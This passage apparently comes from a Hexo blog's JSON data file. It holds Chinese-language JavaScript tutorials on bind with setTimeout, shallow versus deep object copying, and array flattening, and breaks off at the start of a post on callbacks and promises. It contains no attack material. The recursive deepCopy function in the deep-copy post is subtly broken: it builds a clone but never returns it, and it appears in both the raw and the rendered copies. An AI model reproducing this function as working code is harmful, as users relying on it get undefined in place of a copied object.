class=\"line\">        &#125;.bind(<span class=\"keyword\">this</span>));</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h3 id=\"setTimeout\"><a href=\"#setTimeout\" class=\"headerlink\" title=\"setTimeout\"></a>setTimeout</h3><figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">LateBloomer</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">this</span>.petalCount = <span class=\"built_in\">Math</span>.ceil(<span class=\"built_in\">Math</span>.random() * <span class=\"number\">12</span>) + <span class=\"number\">1</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 在 1 秒钟后声明 bloom</span></span><br><span class=\"line\">LateBloomer.prototype.bloom = <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">  setTimeout(<span class=\"keyword\">this</span>.declare.bind(<span class=\"keyword\">this</span>), <span class=\"number\">1000</span>);</span><br><span class=\"line\">&#125;;</span><br><span class=\"line\"></span><br><span class=\"line\">LateBloomer.prototype.declare = <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">  <span class=\"built_in\">console</span>.log(<span class=\"string\">'I am a beautiful flower with '</span> +</span><br><span class=\"line\">    <span class=\"keyword\">this</span>.petalCount + <span class=\"string\">' petals!'</span>);</span><br><span class=\"line\">&#125;;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">var</span> flower = <span class=\"keyword\">new</span> LateBloomer();</span><br><span class=\"line\">flower.bloom();  <span class=\"comment\">// 一秒钟后, 调用'declare'方法</span></span><br></pre></td></tr></table></figure>\n<h1 id=\"后记\"><a href=\"#后记\" class=\"headerlink\" title=\"后记\"></a>后记</h1>"},{"title":"对象的浅复制与深复制","date":"2019-03-01T01:59:31.000Z","updated":"2019-03-01T01:59:31.000Z","_content":"\n# 前言\n\n虽然之前也知道浅复制是复制引用，深复制是新建一个对象，但是今天发现对于一些特殊类型还可以更高效的实现，因此整体梳理下作个备忘。\n\n# 概述\n\n之所以存在浅复制与深复制的概念，主要是因为变量在内存中的存放机制不同。\n基本类型直接放栈内存中，而引用类型是引用（指针）放在栈内存，主体数据放在堆内存中。对于堆栈内存的理解，可以简单类比为库房与前台店面，小东西可以直接店面展示（例如便利店），大物件只能放个模型对应具体哪一户（例如售楼处）。示例图如下：\n\n![堆栈内存示例图](1.jpg)\n\n<!-- more -->\n\n# 详述\n\n所谓浅复制与深复制主要针对引用类型，因为基本类型赋值就是值传递，而引用类型赋值是传递引用（指针）。我们可以把该对象的引用赋值给多个变量，他们指向同一个堆内存中的位置，只要其中一个改变了对象数据，其他的得到的也是变化后的，因为大家都指向一个堆内存中的数据。\n\n为了阻断这种影响，那么只能在堆内存中也复制一份，各自引用指向各自的堆数据。\n\n## 值不是 undefined,function,symbol 的对象\n\n```js\nfunction deepCopy(obj) {\n  return JSON.parse(JSON.stringify(obj));\n}\n// 示例\nlet a = [0, 1, [2, 3], 4],\n  b = deepCopy(a);\na[0] = 1;\na[2][0] = 1;\nconsole.log(a, b);\n```\n\n## 深拷贝\n\n```js\nfunction deepCopy(obj) {\n  var cloneObj = Array.isArray(obj) ? [] : {};\n  for (var key in obj) {\n    if (obj.hasOwnProperty(key)) {\n      if (typeof obj[key] == \"object\") {\n        // 递归\n        cloneObj[key] = deepCopy(obj[key]);\n      } else {\n        cloneObj[key] = obj[key];\n      }\n    }\n  }\n}\n```\n\n# 后记\n[图片来源](https://www.cnblogs.com/jingwhale/p/4884759.html)","source":"_posts/2019/03/2019-03-01-对象的浅复制与深复制.md","raw":"---\ntitle: 对象的浅复制与深复制\ntags:\n  - JavaScript\ncategories:\n  - 前端\ndate: 2019-03-01 09:59:31\nupdated: 2019-03-01 09:59:31\n---\n\n# 前言\n\n虽然之前也知道浅复制是复制引用，深复制是新建一个对象，但是今天发现对于一些特殊类型还可以更高效的实现，因此整体梳理下作个备忘。\n\n# 概述\n\n之所以存在浅复制与深复制的概念，主要是因为变量在内存中的存放机制不同。\n基本类型直接放栈内存中，而引用类型是引用（指针）放在栈内存，主体数据放在堆内存中。对于堆栈内存的理解，可以简单类比为库房与前台店面，小东西可以直接店面展示（例如便利店），大物件只能放个模型对应具体哪一户（例如售楼处）。示例图如下：\n\n![堆栈内存示例图](1.jpg)\n\n<!-- more -->\n\n# 详述\n\n所谓浅复制与深复制主要针对引用类型，因为基本类型赋值就是值传递，而引用类型赋值是传递引用（指针）。我们可以把该对象的引用赋值给多个变量，他们指向同一个堆内存中的位置，只要其中一个改变了对象数据，其他的得到的也是变化后的，因为大家都指向一个堆内存中的数据。\n\n为了阻断这种影响，那么只能在堆内存中也复制一份，各自引用指向各自的堆数据。\n\n## 值不是 undefined,function,symbol 的对象\n\n```js\nfunction deepCopy(obj) {\n  return JSON.parse(JSON.stringify(obj));\n}\n// 示例\nlet a = [0, 1, [2, 3], 4],\n  b = deepCopy(a);\na[0] = 1;\na[2][0] = 1;\nconsole.log(a, b);\n```\n\n## 深拷贝\n\n```js\nfunction deepCopy(obj) {\n  var cloneObj = Array.isArray(obj) ? [] : {};\n  for (var key in obj) {\n    if (obj.hasOwnProperty(key)) {\n      if (typeof obj[key] == \"object\") {\n        // 递归\n        cloneObj[key] = deepCopy(obj[key]);\n      } else {\n        cloneObj[key] = obj[key];\n      }\n    }\n  }\n}\n```\n\n# 后记\n[图片来源](https://www.cnblogs.com/jingwhale/p/4884759.html)","slug":"2019-03-01-对象的浅复制与深复制","published":1,"comments":1,"layout":"post","photos":[],"link":"","_id":"ck0m3d8wu004lwovvmwcrv11t","content":"<h1 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h1><p>虽然之前也知道浅复制是复制引用，深复制是新建一个对象，但是今天发现对于一些特殊类型还可以更高效的实现，因此整体梳理下作个备忘。</p>\n<h1 id=\"概述\"><a href=\"#概述\" class=\"headerlink\" title=\"概述\"></a>概述</h1><p>之所以存在浅复制与深复制的概念，主要是因为变量在内存中的存放机制不同。<br>基本类型直接放栈内存中，而引用类型是引用（指针）放在栈内存，主体数据放在堆内存中。对于堆栈内存的理解，可以简单类比为库房与前台店面，小东西可以直接店面展示（例如便利店），大物件只能放个模型对应具体哪一户（例如售楼处）。示例图如下：</p>\n<p><img src=\"/2019-03-01-对象的浅复制与深复制/1.jpg\" alt=\"堆栈内存示例图\"></p>\n<a id=\"more\"></a>\n<h1 id=\"详述\"><a href=\"#详述\" class=\"headerlink\" title=\"详述\"></a>详述</h1><p>所谓浅复制与深复制主要针对引用类型，因为基本类型赋值就是值传递，而引用类型赋值是传递引用（指针）。我们可以把该对象的引用赋值给多个变量，他们指向同一个堆内存中的位置，只要其中一个改变了对象数据，其他的得到的也是变化后的，因为大家都指向一个堆内存中的数据。</p>\n<p>为了阻断这种影响，那么只能在堆内存中也复制一份，各自引用指向各自的堆数据。</p>\n<h2 id=\"值不是-undefined-function-symbol-的对象\"><a href=\"#值不是-undefined-function-symbol-的对象\" class=\"headerlink\" title=\"值不是 undefined,function,symbol 的对象\"></a>值不是 undefined,function,symbol 的对象</h2><figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">deepCopy</span>(<span class=\"params\">obj</span>) </span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> <span class=\"built_in\">JSON</span>.parse(<span class=\"built_in\">JSON</span>.stringify(obj));</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"comment\">// 示例</span></span><br><span class=\"line\"><span class=\"keyword\">let</span> a = [<span class=\"number\">0</span>, <span class=\"number\">1</span>, [<span class=\"number\">2</span>, <span class=\"number\">3</span>], <span class=\"number\">4</span>],</span><br><span class=\"line\">  b = deepCopy(a);</span><br><span class=\"line\">a[<span class=\"number\">0</span>] = <span class=\"number\">1</span>;</span><br><span class=\"line\">a[<span class=\"number\">2</span>][<span class=\"number\">0</span>] = <span class=\"number\">1</span>;</span><br><span class=\"line\"><span class=\"built_in\">console</span>.log(a, b);</span><br></pre></td></tr></table></figure>\n<h2 id=\"深拷贝\"><a href=\"#深拷贝\" class=\"headerlink\" title=\"深拷贝\"></a>深拷贝</h2><figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">deepCopy</span>(<span class=\"params\">obj</span>) </span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">var</span> cloneObj = <span class=\"built_in\">Array</span>.isArray(obj) ? [] : &#123;&#125;;</span><br><span class=\"line\">  <span class=\"keyword\">for</span> (<span class=\"keyword\">var</span> key <span class=\"keyword\">in</span> obj) &#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (obj.hasOwnProperty(key)) &#123;</span><br><span class=\"line\">      <span class=\"keyword\">if</span> (<span class=\"keyword\">typeof</span> obj[key] == <span class=\"string\">\"object\"</span>) &#123;</span><br><span class=\"line\">        <span class=\"comment\">// 递归</span></span><br><span class=\"line\">        cloneObj[key] = deepCopy(obj[key]);</span><br><span class=\"line\">      &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">        cloneObj[key] = obj[key];</span><br><span class=\"line\">      &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h1 id=\"后记\"><a href=\"#后记\" class=\"headerlink\" title=\"后记\"></a>后记</h1><p><a href=\"https://www.cnblogs.com/jingwhale/p/4884759.html\" target=\"_blank\" rel=\"noopener\">图片来源</a></p>\n","site":{"data":{}},"excerpt":"<h1 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h1><p>虽然之前也知道浅复制是复制引用，深复制是新建一个对象，但是今天发现对于一些特殊类型还可以更高效的实现，因此整体梳理下作个备忘。</p>\n<h1 id=\"概述\"><a href=\"#概述\" class=\"headerlink\" title=\"概述\"></a>概述</h1><p>之所以存在浅复制与深复制的概念，主要是因为变量在内存中的存放机制不同。<br>基本类型直接放栈内存中，而引用类型是引用（指针）放在栈内存，主体数据放在堆内存中。对于堆栈内存的理解，可以简单类比为库房与前台店面，小东西可以直接店面展示（例如便利店），大物件只能放个模型对应具体哪一户（例如售楼处）。示例图如下：</p>\n<p><img src=\"/2019-03-01-对象的浅复制与深复制/1.jpg\" alt=\"堆栈内存示例图\"></p>","more":"<h1 id=\"详述\"><a href=\"#详述\" class=\"headerlink\" title=\"详述\"></a>详述</h1><p>所谓浅复制与深复制主要针对引用类型，因为基本类型赋值就是值传递，而引用类型赋值是传递引用（指针）。我们可以把该对象的引用赋值给多个变量，他们指向同一个堆内存中的位置，只要其中一个改变了对象数据，其他的得到的也是变化后的，因为大家都指向一个堆内存中的数据。</p>\n<p>为了阻断这种影响，那么只能在堆内存中也复制一份，各自引用指向各自的堆数据。</p>\n<h2 id=\"值不是-undefined-function-symbol-的对象\"><a href=\"#值不是-undefined-function-symbol-的对象\" class=\"headerlink\" title=\"值不是 undefined,function,symbol 的对象\"></a>值不是 undefined,function,symbol 的对象</h2><figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">deepCopy</span>(<span class=\"params\">obj</span>) </span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> <span class=\"built_in\">JSON</span>.parse(<span class=\"built_in\">JSON</span>.stringify(obj));</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"comment\">// 示例</span></span><br><span class=\"line\"><span class=\"keyword\">let</span> a = [<span class=\"number\">0</span>, <span class=\"number\">1</span>, [<span class=\"number\">2</span>, <span class=\"number\">3</span>], <span class=\"number\">4</span>],</span><br><span class=\"line\">  b = deepCopy(a);</span><br><span class=\"line\">a[<span class=\"number\">0</span>] = <span class=\"number\">1</span>;</span><br><span class=\"line\">a[<span class=\"number\">2</span>][<span class=\"number\">0</span>] = <span class=\"number\">1</span>;</span><br><span class=\"line\"><span class=\"built_in\">console</span>.log(a, b);</span><br></pre></td></tr></table></figure>\n<h2 id=\"深拷贝\"><a href=\"#深拷贝\" class=\"headerlink\" title=\"深拷贝\"></a>深拷贝</h2><figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">deepCopy</span>(<span class=\"params\">obj</span>) </span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">var</span> cloneObj = <span class=\"built_in\">Array</span>.isArray(obj) ? [] : &#123;&#125;;</span><br><span class=\"line\">  <span class=\"keyword\">for</span> (<span class=\"keyword\">var</span> key <span class=\"keyword\">in</span> obj) &#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (obj.hasOwnProperty(key)) &#123;</span><br><span class=\"line\">      <span class=\"keyword\">if</span> (<span class=\"keyword\">typeof</span> obj[key] == <span class=\"string\">\"object\"</span>) &#123;</span><br><span class=\"line\">        <span class=\"comment\">// 递归</span></span><br><span class=\"line\">        cloneObj[key] = deepCopy(obj[key]);</span><br><span class=\"line\">      &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">        cloneObj[key] = obj[key];</span><br><span class=\"line\">      &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h1 id=\"后记\"><a href=\"#后记\" class=\"headerlink\" title=\"后记\"></a>后记</h1><p><a href=\"https://www.cnblogs.com/jingwhale/p/4884759.html\" target=\"_blank\" rel=\"noopener\">图片来源</a></p>"},{"title":"数组扁平化","date":"2019-03-01T08:38:15.000Z","updated":"2019-03-01T08:38:15.000Z","_content":"# 前言\n题目：将[1,2,[3,[4,5]]]转化成[1,2,3,4,5]。\n# 概述\n二维数组与多维数组都有哪些方法。\n<!-- more -->\n# 详述\n## 递归（通用）\n```js\nvar arr = [1, 2, [3, [4, 5]]];\n \nfunction flatten(arr) {\n\tvar res = [];\n\tfor(var i = 0; i < arr.length; i++) {\n\t\tif(Array.isArray(arr[i])) {\n\t\t\tres = res.concat(flatten(arr[i]));\n\t\t} else {\n\t\t\tres.push(arr[i]);\n\t\t}\n\t}\n\treturn res;\n}\n \nvar result = flatten(arr);\nconsole.log(result);\n```\n## 简单二维\n```js\nconst arr = [11, [22, 33], [44, 55], 66];\nconst flatArr = arr.join().split(','); // [\"11\", \"22\", \"33\", \"44\", \"55\", \"66\"]\n\n\nconst arr = [11, [22, 33], [44, 55], 66];\nconst flatArr = arr.toString().split(','); // [\"11\", \"22\", \"33\", \"44\", \"55\", \"66\"]\n```\n## flat()方法（兼容问题）\n```js\n[1, 2, [3, [4, 5]]].flat()\n// [1, 2, 3, [4, 5]]\n\n[1, 2, [3, [4, 5]]].flat(2)\n// [1, 2, 3, 4, 5]\n```\n# 后记\n参考：https://www.cnblogs.com/mengfangui/p/9485703.html","source":"_posts/2019/03/2019-03-01-数组扁平化.md","raw":"---\ntitle: 数组扁平化\ntags:\n  - JavaScript\ncategories:\n  - 前端\ndate: 2019-03-01 16:38:15\nupdated: 2019-03-01 16:38:15\n---\n# 前言\n题目：将[1,2,[3,[4,5]]]转化成[1,2,3,4,5]。\n# 概述\n二维数组与多维数组都有哪些方法。\n<!-- more -->\n# 详述\n## 递归（通用）\n```js\nvar arr = [1, 2, [3, [4, 5]]];\n \nfunction flatten(arr) {\n\tvar res = [];\n\tfor(var i = 0; i < arr.length; i++) {\n\t\tif(Array.isArray(arr[i])) {\n\t\t\tres = res.concat(flatten(arr[i]));\n\t\t} else {\n\t\t\tres.push(arr[i]);\n\t\t}\n\t}\n\treturn res;\n}\n \nvar result = flatten(arr);\nconsole.log(result);\n```\n## 简单二维\n```js\nconst arr = [11, [22, 33], [44, 55], 66];\nconst flatArr = arr.join().split(','); // [\"11\", \"22\", \"33\", \"44\", \"55\", \"66\"]\n\n\nconst arr = [11, [22, 33], [44, 55], 66];\nconst flatArr = arr.toString().split(','); // [\"11\", \"22\", \"33\", \"44\", \"55\", \"66\"]\n```\n## flat()方法（兼容问题）\n```js\n[1, 2, [3, [4, 5]]].flat()\n// [1, 2, 3, [4, 5]]\n\n[1, 2, [3, [4, 5]]].flat(2)\n// [1, 2, 3, 4, 5]\n```\n# 后记\n参考：https://www.cnblogs.com/mengfangui/p/9485703.html","slug":"2019-03-01-数组扁平化","published":1,"comments":1,"layout":"post","photos":[],"link":"","_id":"ck0m3d8wv004owovvy97h5ucr","content":"<h1 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h1><p>题目：将[1,2,[3,[4,5]]]转化成[1,2,3,4,5]。</p>\n<h1 id=\"概述\"><a href=\"#概述\" class=\"headerlink\" title=\"概述\"></a>概述</h1><p>二维数组与多维数组都有哪些方法。<br><a id=\"more\"></a></p>\n<h1 id=\"详述\"><a href=\"#详述\" class=\"headerlink\" title=\"详述\"></a>详述</h1><h2 id=\"递归（通用）\"><a href=\"#递归（通用）\" class=\"headerlink\" title=\"递归（通用）\"></a>递归（通用）</h2><figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">var</span> arr = [<span class=\"number\">1</span>, <span class=\"number\">2</span>, [<span class=\"number\">3</span>, [<span class=\"number\">4</span>, <span class=\"number\">5</span>]]];</span><br><span class=\"line\"> </span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">flatten</span>(<span class=\"params\">arr</span>) </span>&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">var</span> res = [];</span><br><span class=\"line\">\t<span class=\"keyword\">for</span>(<span class=\"keyword\">var</span> i = <span class=\"number\">0</span>; i &lt; arr.length; i++) &#123;</span><br><span class=\"line\">\t\t<span class=\"keyword\">if</span>(<span class=\"built_in\">Array</span>.isArray(arr[i])) &#123;</span><br><span class=\"line\">\t\t\tres = res.concat(flatten(arr[i]));</span><br><span class=\"line\">\t\t&#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">\t\t\tres.push(arr[i]);</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> res;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"> </span><br><span class=\"line\"><span class=\"keyword\">var</span> result = flatten(arr);</span><br><span class=\"line\"><span class=\"built_in\">console</span>.log(result);</span><br></pre></td></tr></table></figure>\n<h2 id=\"简单二维\"><a href=\"#简单二维\" class=\"headerlink\" title=\"简单二维\"></a>简单二维</h2><figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">const</span> arr = [<span class=\"number\">11</span>, [<span class=\"number\">22</span>, <span class=\"number\">33</span>], [<span class=\"number\">44</span>, <span class=\"number\">55</span>], <span class=\"number\">66</span>];</span><br><span class=\"line\"><span class=\"keyword\">const</span> flatArr = arr.join().split(<span class=\"string\">','</span>); <span class=\"comment\">// [\"11\", \"22\", \"33\", \"44\", \"55\", \"66\"]</span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">const</span> arr = [<span class=\"number\">11</span>, [<span class=\"number\">22</span>, <span class=\"number\">33</span>], [<span class=\"number\">44</span>, <span class=\"number\">55</span>], <span class=\"number\">66</span>];</span><br><span class=\"line\"><span class=\"keyword\">const</span> flatArr = arr.toString().split(<span class=\"string\">','</span>); <span class=\"comment\">// [\"11\", \"22\", \"33\", \"44\", \"55\", \"66\"]</span></span><br></pre></td></tr></table></figure>\n<h2 id=\"flat-方法（兼容问题）\"><a href=\"#flat-方法（兼容问题）\" class=\"headerlink\" title=\"flat()方法（兼容问题）\"></a>flat()方法（兼容问题）</h2><figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">[<span class=\"number\">1</span>, <span class=\"number\">2</span>, [<span class=\"number\">3</span>, [<span class=\"number\">4</span>, <span class=\"number\">5</span>]]].flat()</span><br><span class=\"line\"><span class=\"comment\">// [1, 2, 3, [4, 5]]</span></span><br><span class=\"line\"></span><br><span class=\"line\">[<span class=\"number\">1</span>, <span class=\"number\">2</span>, [<span class=\"number\">3</span>, [<span class=\"number\">4</span>, <span class=\"number\">5</span>]]].flat(<span class=\"number\">2</span>)</span><br><span class=\"line\"><span class=\"comment\">// [1, 2, 3, 4, 5]</span></span><br></pre></td></tr></table></figure>\n<h1 id=\"后记\"><a href=\"#后记\" class=\"headerlink\" title=\"后记\"></a>后记</h1><p>参考：<a href=\"https://www.cnblogs.com/mengfangui/p/9485703.html\" target=\"_blank\" rel=\"noopener\">https://www.cnblogs.com/mengfangui/p/9485703.html</a></p>\n","site":{"data":{}},"excerpt":"<h1 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h1><p>题目：将[1,2,[3,[4,5]]]转化成[1,2,3,4,5]。</p>\n<h1 id=\"概述\"><a href=\"#概述\" class=\"headerlink\" title=\"概述\"></a>概述</h1><p>二维数组与多维数组都有哪些方法。<br></p>","more":"<p></p>\n<h1 id=\"详述\"><a href=\"#详述\" class=\"headerlink\" title=\"详述\"></a>详述</h1><h2 id=\"递归（通用）\"><a href=\"#递归（通用）\" class=\"headerlink\" title=\"递归（通用）\"></a>递归（通用）</h2><figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">var</span> arr = [<span class=\"number\">1</span>, <span class=\"number\">2</span>, [<span class=\"number\">3</span>, [<span class=\"number\">4</span>, <span class=\"number\">5</span>]]];</span><br><span class=\"line\"> </span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">flatten</span>(<span class=\"params\">arr</span>) </span>&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">var</span> res = [];</span><br><span class=\"line\">\t<span class=\"keyword\">for</span>(<span class=\"keyword\">var</span> i = <span class=\"number\">0</span>; i &lt; arr.length; i++) &#123;</span><br><span class=\"line\">\t\t<span class=\"keyword\">if</span>(<span class=\"built_in\">Array</span>.isArray(arr[i])) &#123;</span><br><span class=\"line\">\t\t\tres = res.concat(flatten(arr[i]));</span><br><span class=\"line\">\t\t&#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">\t\t\tres.push(arr[i]);</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> res;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"> </span><br><span class=\"line\"><span class=\"keyword\">var</span> result = flatten(arr);</span><br><span class=\"line\"><span class=\"built_in\">console</span>.log(result);</span><br></pre></td></tr></table></figure>\n<h2 id=\"简单二维\"><a href=\"#简单二维\" class=\"headerlink\" title=\"简单二维\"></a>简单二维</h2><figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">const</span> arr = [<span class=\"number\">11</span>, [<span class=\"number\">22</span>, <span class=\"number\">33</span>], [<span class=\"number\">44</span>, <span class=\"number\">55</span>], <span class=\"number\">66</span>];</span><br><span class=\"line\"><span class=\"keyword\">const</span> flatArr = arr.join().split(<span class=\"string\">','</span>); <span class=\"comment\">// [\"11\", \"22\", \"33\", \"44\", \"55\", \"66\"]</span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">const</span> arr = [<span class=\"number\">11</span>, [<span class=\"number\">22</span>, <span class=\"number\">33</span>], [<span class=\"number\">44</span>, <span class=\"number\">55</span>], <span class=\"number\">66</span>];</span><br><span class=\"line\"><span class=\"keyword\">const</span> flatArr = arr.toString().split(<span class=\"string\">','</span>); <span class=\"comment\">// [\"11\", \"22\", \"33\", \"44\", \"55\", \"66\"]</span></span><br></pre></td></tr></table></figure>\n<h2 id=\"flat-方法（兼容问题）\"><a href=\"#flat-方法（兼容问题）\" class=\"headerlink\" title=\"flat()方法（兼容问题）\"></a>flat()方法（兼容问题）</h2><figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">[<span class=\"number\">1</span>, <span class=\"number\">2</span>, [<span class=\"number\">3</span>, [<span class=\"number\">4</span>, <span class=\"number\">5</span>]]].flat()</span><br><span class=\"line\"><span class=\"comment\">// [1, 2, 3, [4, 5]]</span></span><br><span class=\"line\"></span><br><span class=\"line\">[<span class=\"number\">1</span>, <span class=\"number\">2</span>, [<span class=\"number\">3</span>, [<span class=\"number\">4</span>, <span class=\"number\">5</span>]]].flat(<span class=\"number\">2</span>)</span><br><span class=\"line\"><span class=\"comment\">// [1, 2, 3, 4, 5]</span></span><br></pre></td></tr></table></figure>\n<h1 id=\"后记\"><a href=\"#后记\" class=\"headerlink\" title=\"后记\"></a>后记</h1><p>参考：<a href=\"https://www.cnblogs.com/mengfangui/p/9485703.html\" target=\"_blank\" rel=\"noopener\">https://www.cnblogs.com/mengfangui/p/9485703.html</a></p>"},{"title":"异步之回调,promise,async/await","date":"2019-03-02T08:19:52.000Z","updated":"2019-03-02T08:19:52.000Z","_content":"# 前言\n场景：点击按钮下载商品数据。涉及到异步账户检查，首先有没有登录，如果登录了，再检查是否是合法用户，\b如果是合法的那么继续下面操作。\n# 概述\n在JavaScript中处理异步请求是用的回调函数，对于需要顺序处理异步请求的，就得一层层嵌套回调，层数多了就很难维护了，就是大家说的“回调地狱”，怎么才能像同步代码那样优雅的写呢？这就是ES6的promise及ES7的async/await要解决的问题。\n<!-- more -->\n# 详述\n\n## 示例一：回调函数\n```js\n// 执行下载数据\nfunction doExportData(data) {\n    console.log('[export data]param:' + JSON.stringify(data));\n}\n\nfunction exportData() {\n    // 模拟ajax检查是否登录\n    setTimeout(() => {\n        let response = {\n            code: '10001',\n            data: {\n                param1: '12345'\n            }\n        };\n        console.log('检查登录请求完成：' + response);\n        // 